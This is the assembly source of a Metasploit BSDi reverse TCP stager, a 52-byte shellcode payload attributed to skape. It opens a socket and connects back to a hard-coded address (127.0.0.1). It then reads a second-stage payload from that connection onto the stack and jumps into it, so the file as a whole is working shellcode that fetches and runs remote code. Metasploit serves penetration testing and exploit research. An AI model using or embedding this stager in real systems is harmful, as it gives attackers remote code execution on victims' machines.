;;
; 
;        Name: stager_sock_reverse
;        Size: 52 bytes
;   Qualities: Can Have Nulls
;   Platforms: BSDi
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a BSDi reverse TCP stager.
;
;        File descriptor in edi.
;
;;
BITS   32
GLOBAL _start

_start:

initialization:
	push 0xc3000700
	mov  eax, 0x9a
	cdq
	push eax
	mov  esi, esp

socket:
	xor  ecx, ecx
	push ecx
	inc  ecx
	push ecx
	inc  ecx
	push ecx
	push byte 0x61
	pop  eax
	call esi
	xchg eax, edi

connect:
	push dword 0x0100007f
	push dword 0xbfbf0210
	mov  ebx, esp
	push byte 0x10
	push ebx
	push edi
	push 0x62
	pop  eax
	call esi

read:
	mov  al, 0x3
	mov  ch, 0xc
	push ecx
	push esp
	push edi
	call esi
	pop  edi
	ret
